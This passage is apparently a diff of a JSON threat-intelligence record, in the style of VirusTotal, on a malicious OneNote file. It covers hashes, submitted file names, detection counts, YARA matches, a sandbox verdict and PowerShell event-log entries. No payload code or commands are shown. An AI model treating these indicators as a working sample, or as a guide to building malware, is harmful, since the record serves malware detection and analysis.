-                  "EventID": "4104",
-                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
-                  "ScriptBlockId": "106909cd-7ba6-4266-85cf-6f682fe08179",
-                  "MessageNumber": "1",
-                  "Path": "",
-                  "MessageTotal": "1"
-                }
-              },
-              {
-                "values": {
-                  "EventID": "4104",
-                  "ScriptBlockText": "10050407a4d401ef56d5a9ece4ccb6f08bba5c1ff6dfd318e419c04a972ba748",
-                  "ScriptBlockId": "605b9355-0a82-43d4-a475-ae7e343040b2",
-                  "MessageNumber": "1",
-                  "Path": "",
-                  "MessageTotal": "1"
-                }
-              }
-            ]
+            "file_type": "Microsoft OneNote note",
+            "probability": 100.0
           }
         ],
-        "meaningful_name": "0a34ca695a121a979f.one",
+        "tags": [
+          "persistence",
+          "one"
+        ],
+        "sha1": "7d82e6b9f0821806bdb1d20a9fdd8c1576059843",
+        "type_description": "MS OneNote Note",
+        "sandbox_verdicts": {
+          "Yomi Hunter": {
+            "category": "undetected",
+            "sandbox_name": "Yomi Hunter",
+            "malware_classification": [
+              "UNKNOWN_VERDICT"
+            ]
+          }
+        },
+        "ssdeep": "6144:PkIk+ai6laI6ggUOqa1fmioLyVmWgs6kI:kaI6jF1fmYESu",
+        "size": 258256,
+        "magic": "data",
+        "magika": "UNKNOWN",
         "crowdsourced_yara_results": [
           {
             "ruleset_id": "01267baf74",
@@ -949,57 +999,7 @@
             "match_date": 1735365962,
             "source": "https://github.com/InQuest/yara-rules-vt"
           }
-        ],
-        "trid": [
-          {
-            "file_type": "Microsoft OneNote note",
-            "probability": 100.0
-          }
-        ],
-        "tlsh": "T18E44F193841A185BD9A3877C8DE24B18FB1BC8C18346CF6D7D9160AA1D2F3B3D857A4D",
-        "last_submission_date": 1735429668,
-        "size": 258256,
-        "names": [
-          "0a34ca695a121a979f.one",
-          "0a34ca695a121a979f.doc",
-          "0a34ca695a121a9f.one",
-          "0a34ca695a121a9f.doc",
-          "0a34ca695a121a9757c72fc0b78101eefba974896da6913d87c2a0575d15bc9f.doc",
-          "0a34ca695a121a9757c72fc0b78101eefba974896da6913d87c2a0575d15bc9f.one",
-          "4bc433a2119001680cf41b0f452f1765.one.vir",
-          "4bc433a2119001680cf41b0f452f1765.doc.vir"
-        ],
-        "reputation": -58,
-        "sigma_analysis_stats": {
-          "critical": 0,
-          "high": 3,
-          "medium": 5,
-          "low": 1
-        },
-        "sha1": "7d82e6b9f0821806bdb1d20a9fdd8c1576059843",
-        "total_votes": {
-          "harmless": 0,
-          "malicious": 1
-        },
-        "last_modification_date": 1750679852,
-        "ssdeep": "6144:PkIk+ai6laI6ggUOqa1fmioLyVmWgs6kI:kaI6jF1fmYESu",
-        "last_analysis_stats": {
-          "malicious": 28,
-          "suspicious": 0,
-          "undetected": 33,
-          "harmless": 0,
-          "timeout": 0,
-          "confirmed-timeout": 0,
-          "failure": 0,
-          "type-unsupported": 15
-        },
-        "filecondis": {
-          "dhash": "0000181c1d180000",
-          "raw_md5": "1252e4e77082ad6c4ecd31dfcb102bfb"
-        },
-        "md5": "4bc433a2119001680cf41b0f452f1765",
-        "times_submitted": 27,
-        "sha256": "0a34ca695a121a9757c72fc0b78101eefba974896da6913d87c2a0575d15bc9f"
+        ]
       }
     }
   }
